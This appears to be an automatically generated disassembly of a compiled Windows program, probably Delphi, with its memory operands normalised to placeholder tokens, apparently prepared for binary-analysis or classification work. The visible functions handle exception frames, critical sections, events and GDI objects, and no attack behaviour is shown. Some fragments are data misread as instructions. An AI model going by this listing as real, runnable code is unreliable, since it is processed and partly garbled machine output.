mov edx [ edx + 0x8 ]
xchg edx eax
call sub_4138bc
retn
sub_414315
jmp sub_40382c
sub_41431c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414360
xor edx edx
call sub_41421c
retn
sub_4143b8
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_414422
jmp sub_40382c
sub_4145ee
jmp sub_40382c
sub_4145f5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414612
lea eax [ ebp - 0xc ]
call sub_403eac
retn
sub_41460b
jmp sub_40382c
sub_414612
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41469c
jmp sub_40382c
sub_4146b4
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_414770
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_414819
jmp sub_40382c
sub_414820
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41482c
mov eax [ ebp + 0x4 ]
retn
sub_414862
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4148b0
jmp sub_40382c
sub_4148b7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414976
jmp sub_40382c
sub_41497d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41499f
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403ed0
retn
sub_414998
jmp sub_40382c
sub_41499f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4149a8
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_4149b0
xor eax eax
retn
sub_4149f9
jmp sub_40382c
sub_414a00
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_414b13
jmp sub_40382c
sub_414b1a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414ba8
jmp sub_40382c
sub_414baf
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414c7f
jmp sub_40382c
sub_414c86
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414d3c
jmp sub_40382c
sub_414d43
pop esi
pop ecx
pop ebp
retn
sub_414dc8
jmp sub_40382c
sub_414dcf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414dec
lea eax [ ebp - 0x8 ]
call sub_403eac
retn
sub_414de5
jmp sub_40382c
sub_414dec
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414e78
jmp sub_40382c
sub_414e95
jmp sub_40382c
sub_414e9c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414ed8
retn
sub_414f5b
jmp sub_40382c
sub_414f62
mov eax [ ebp - 0x8 ]
call sub_417a9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414f87
lea eax [ ebp - 0xc ]
call sub_403eac
retn
sub_414f80
jmp sub_40382c
sub_414f87
mov esp ebp
pop ebp
retn
sub_414fd7
jmp sub_40382c
sub_414fde
pop esi
pop ecx
pop ebp
retn
sub_415031
jmp sub_40382c
sub_415038
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_415040
retn
sub_4150bb
jmp sub_40382c
sub_4150c2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41515f
jmp sub_40382c
sub_415166
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415183
lea eax [ ebp - 0x8 ]
call sub_403eac
retn
sub_41517c
jmp sub_40382c
sub_415183
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415188
retn
sub_415202
jmp sub_40382c
sub_415209
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415210
mov eax edx
mov edx ecx
call sub_407b0c
retn
sub_41521c
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_415234
sub_4152ac
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_41531c
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_415338
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41552c
mov eax [ eax + 0x18 ]
retn
sub_415530
mov eax [ eax + 0x14 ]
retn
sub_4155cc
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_4157d8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_40270c
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_415814
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_41582c
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_415840
mov edx sub_41582c
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_415888
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_407b0c
retn
mov eax edx
mov edx ecx
call sub_407ad4
retn
sub_415924
retn
sub_415c1c
jmp sub_40382c
sub_415c23
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_415c84
jmp sub_40382c
sub_415c8b
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415cd0
mov eax [ eax + 0x4 ]
call sub_408064
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_415ce0
mov eax [ eax + 0x4 ]
call sub_408090
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_415d1c
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_415ec5
jmp sub_40382c
sub_415f24
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_415fb4
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_416004
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_4161ef
jmp sub_40382c
sub_4161f6
mov esp ebp
pop ebp
retn
sub_4162a0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
call sub_403864
retn
sub_416328
mov [ eax + 0x18 ] edx
retn
sub_4164a4
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_410678
retn
sub_41652b
jmp sub_40382c
sub_416532
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4165de
jmp sub_40382c
sub_4165e5
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_416789
jmp sub_40382c
sub_4167db
jmp sub_40382c
sub_4167fa
jmp sub_40382c
sub_416801
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416820
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_416819
jmp sub_40382c
sub_416820
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4168c3
jmp sub_40382c
sub_41694b
jmp sub_40382c
sub_416958
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
call sub_403864
pop ebx
retn
sub_416970
mov eax [ rw-data ]
call sub_416958
retn
sub_4169a8
push ebx
call sub_410530
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_416970
sub_416b15
jmp sub_40382c
sub_416b1c
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_403eac
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_416c3c
jmp sub_40382c
sub_416c43
pop edi
pop esi
pop ebx
pop ebp
retn
sub_416d3a
jmp sub_40382c
sub_416d57
jmp sub_40382c
sub_416d5e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416e5c
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_4158a4
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_416f20
push ebx
mov ebx eax
mov eax ebx
call sub_4188d4
cmp al 0x9
sete al
pop ebx
retn
sub_416f7f
jmp sub_40382c
sub_416f86
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41702c
jmp sub_40382c
sub_417033
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41704c
[ eax ]
sub_4172b2
jmp sub_403578
sub_4172de
jmp sub_403578
sub_417380
jmp sub_403578
sub_417423
jmp sub_403578
sub_4175fb
jmp sub_403578
sub_41763d
jmp sub_40382c
sub_41766d
jmp sub_40382c
sub_417674
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4176e3
jmp sub_40382c
sub_4177ba
jmp sub_40382c
sub_4177c1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417a94
mov dl 0x1
call sub_4169fc
retn
sub_417bcc
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_417bd5
jmp sub_40382c
j_sub_417bcc
jmp sub_417bcc
sub_417bdc
pop ebx
mov esp ebp
pop ebp
retn
sub_417be4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_4189e4
mov eax [ rw-data ]
call sub_416958
pop ebp
retn
j_sub_4036a4#6
jmp sub_4036a4
j_sub_4036a4#7
jmp sub_4036a4
sub_417d8a
add [ eax ] eax
add [ eax ] al
xor al 0x6d
inc eax
add [ esi - 0x76ffbe83 ] dl
retn
sub_417dd0
jmp sub_40382c
sub_417dd7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417eb7
jmp sub_40382c
sub_417ebe
mov esp ebp
pop ebp
retn
sub_417f76
jmp sub_40382c
sub_417f7d
pop ecx
pop ecx
pop ebp
retn
sub_41827f
jmp sub_40382c
sub_418286
pop ebx
mov esp ebp
pop ebp
retn
sub_41852b
jmp sub_40382c
sub_418532
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_4030f0
retn
sub_41854b
jmp sub_40382c
sub_41856f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_403578
sub_4185a6
jmp sub_403578
sub_4185e5
jmp sub_40382c
sub_4185ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41860e
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_403ed0
retn
sub_418607
jmp sub_40382c
sub_41860e
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418695
jmp sub_403578
sub_4186c2
jmp sub_40382c
sub_4186c9
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4186d4
push ecx
mov edx esp
mov ecx 0x4
call sub_416e98
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_416958
sub_4187e1
jmp sub_40382c
sub_4187e8
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4188c7
jmp sub_40382c
sub_4188ce
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418924
jmp sub_40382c
sub_41892b
pop ebx
pop ecx
pop ebp
retn
sub_418b73
jmp sub_40382c
sub_418b7a
pop ecx
pop ecx
pop ebp
retn
sub_418bbd
jmp sub_40382c
sub_418bc4
pop ebx
pop ecx
pop ebp
retn
sub_418c60
jmp sub_40382c
sub_418c67
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418d15
jmp sub_40382c
sub_418d1c
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418d28
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_418f83
jmp sub_40382c
sub_418f8a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418faf
mov eax [ ebp - 0x8 ]
call sub_4030f0
mov eax [ ebp - 0x4 ]
call sub_4030f0
retn
sub_418fa8
jmp sub_40382c
sub_418faf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418fd4
lea eax [ ebp - 0x1c ]
call sub_4054e8
lea eax [ ebp - 0x18 ]
call sub_403eac
retn
sub_418fcd
jmp sub_40382c
sub_418fd4
pop ebx
mov esp ebp
pop ebp
retn
sub_4191e6
jmp sub_40382c
sub_4191ed
pop ebx
mov esp ebp
pop ebp
retn
sub_419240
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_415b08
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_419258
test dl dl
je r-xdata
mov dl 0x8
call sub_4193dc
retn
mov dl 0x9
call sub_4193dc
retn
sub_4192e0
mov dl 0x1
call sub_4193dc
retn
sub_4192e8
xor edx edx
call sub_4193dc
retn
sub_4193cd
jmp sub_40382c
sub_4193d4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4193f0
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40c5b8
sub_419424
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_41943c
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_419448
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_41943c
sub_419464
mov eax [ rw-data ]
push eax
call SetEvent
retn
sub_419470
push rw-data
call InterlockedIncrement
retn
sub_41947c
push rw-data
call InterlockedDecrement
retn
sub_419592
jmp sub_403578
sub_4195c1
jmp sub_40382c
sub_4195f7
jmp sub_40382c
sub_4195fe
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41961d
push rw-data
call LeaveCriticalSection
retn
sub_419616
jmp sub_40382c
sub_41961d
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419669
jmp sub_403578
sub_41977a
jmp sub_40382c
sub_419781
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_419808
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
call sub_419a38
sub_419882
jmp sub_40382c
sub_419889
pop ebx
mov esp ebp
pop ebp
retn
sub_4198a8
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_4198bc
cmp [ eax + 0x1a ] 0x0
je r-xdata
retn
push eax
push sub_4198a8
call sub_419a10
sub_4199b5
jmp sub_40382c
sub_4199bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4199db
push rw-data
call LeaveCriticalSection
retn
sub_4199d4
jmp sub_40382c
sub_4199db
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call CloseHandle
retn
sub_4199f2
jmp sub_40382c
sub_419a60
mov [ eax + 0xd ] 0x1
retn
sub_419bd0
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_419dac
sub_419c30
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4179e4
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_419c44
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4179e4
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_419c58
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_41926c
retn
sub_419c64
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_41926c
retn
sub_419f0c
xor eax eax
retn
sub_419f10
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_419f18
xor eax eax
retn
sub_419f1c
retn
sub_419f20
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403f00
pop esi
pop ebx
retn
sub_419f34
mov eax [ eax + 0x4 ]
retn
sub_419f38
retn
sub_419f3c
xor eax eax
retn
sub_419f40
retn
sub_419f44
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_419f50
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_419f5c
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_419f68
retn
sub_419f6c
xchg edx eax
call sub_417688
retn
sub_419f74
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_419ffc
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_4032ec
pop esi
retn
sub_41a010
retn
sub_41a0f0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403f00
pop esi
pop ebx
retn
sub_41a130
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_41a27c
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_403320
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_41a294
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_41a31c
retn
sub_41a364
retn
sub_41a39c
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41a3b4
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41a5d8
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_4032ec
pop esi
pop ebx
retn
sub_41a3fc
mov al 0x1
retn
sub_41a400
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41a408
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_41a4b0
xor eax eax
retn
sub_41a4b4
retn
sub_41a4e0
retn
sub_41a578
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_41a58c
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_413704
retn
sub_41a6d3
jmp sub_403578
sub_41a6d8
mov ebx 0x1
call sub_4038e0
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a73b
jmp sub_403578
sub_41a740
mov ebx 0x80030103
call sub_4038e0
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a7be
jmp sub_403578
sub_41a7c3
mov ebx 0x80030009
call sub_4038e0
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_41a821
jmp sub_403578
sub_41a826
mov ebx 0x8000ffff
call sub_4038e0
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a9f1
jmp sub_40382c
sub_41aa02
jmp sub_403578
sub_41aa07
mov [ ebp - 0x4 ] 0x8000ffff
call sub_4038e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41aa30
lea eax [ ebp + 0xc ]
call sub_4054e8
retn
sub_41aa29
jmp sub_40382c
sub_41aa30
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_41aa3c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_41aa48
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_41aa54
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41aa60
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41aacf
jmp sub_403578
sub_41aad4
mov esi 0x8000ffff
call sub_4038e0
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41aae8
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_41ab55
jmp sub_40382c
sub_41ab5c
mov eax [ rw-data ]
call sub_4030f0
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41ab6c
call sub_413050
retn
sub_41ac34
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_41add8
jmp sub_40382c
sub_41addf
pop ebp
retn
sub_41ae6d
jmp sub_40382c
sub_41ae74
pop ebp
retn
sub_41b105
jmp sub_40382c
sub_41b10c
pop ebp
retn
sub_41b110
sub [ rw-data ] 0x1
retn
sub_41bdc8
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_41be3c
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_41beb0
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_41bebc
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41bf9c
jmp sub_40382c
sub_41bfa3
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c033
jmp sub_40382c
sub_41c0c5
jmp sub_40382c
sub_41c0cc
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c130
jmp sub_40382c
sub_41c137
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41c19f
jmp sub_40382c
sub_41c1a6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41c249
jmp sub_40382c
sub_41c250
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c6a8
push 0x33
mov ecx rw-data
call sub_413310
retn
sub_41c6b8
push 0x33
mov ecx rw-data
call sub_4132d0
retn
sub_41c6c8
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41c6ec
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_41c8c0
push 0x11
mov ecx rw-data
call sub_4132d0
retn
sub_41ca00
push ebx
mov ebx eax
mov eax ebx
call sub_41c6c8
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_41caba
jmp sub_40382c
sub_41cac1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c6ec
retn
sub_41cad7
jmp sub_40382c
sub_41caf0
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41cb4d
jmp sub_40382c
sub_41cb54
pop ebx
pop ecx
pop ebp
retn
sub_41cccd
jmp sub_40382c
sub_41ccf5
jmp sub_40382c
sub_41ccfc
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41cd68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_404110
pop esi
pop ebx
retn
sub_41cddc
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_41cd38
push eax
call MulDiv
neg eax
pop ebx
retn
sub_41ce18
mov eax [ eax + 0x10 ]
mov dl [ eax + 0x19 ]
mov eax edx
retn
sub_41ce50
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_41ce80
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_41cf9e
jmp sub_40382c
sub_41cfa5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c6ec
retn
sub_41cfbb
jmp sub_40382c
sub_41d031
jmp sub_40382c
sub_41d038
pop ebx
pop ecx
pop ebp
retn
sub_41d03c
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_41d0f2
jmp sub_40382c
sub_41d104
push esi
cmp dl [ eax + 0x18 ]
je r-xdata
pop esi
retn
mov [ eax + 0x18 ] dl
mov si 0xfffd
call sub_4032ec
sub_41d118
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_41d148
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_41d257
jmp sub_40382c
sub_41d25e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c6ec
retn
sub_41d274
jmp sub_40382c
sub_41d2ed
jmp sub_40382c
sub_41d2f4
pop ebx
pop ecx
pop ebp
retn
sub_41d425
jmp sub_40382c
sub_41d438
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_41d778
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_41d9c4
jmp sub_40382c
sub_41d9cb
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_41d9d4
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_41da0c
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41da18
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41db58
retn
sub_41dc21
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_41dc38
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41dd24
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41dd44
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41dd64
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41dd84
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
call sub_403864
pop ebx
retn
sub_41dd9c
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
call sub_403864
pop ebx
retn
sub_41ddc0
mov eax [ rw-data ]
call sub_41dd9c
retn
sub_41de16
jmp sub_40382c
sub_41de1d
pop ecx
pop ebp
retn
sub_41debc
jmp sub_40382c
sub_41dec3
pop ebx
mov esp ebp
pop ebp
retn
sub_41df95
jmp sub_40382c
sub_41e026
jmp sub_40382c
sub_41e02d
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e058
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
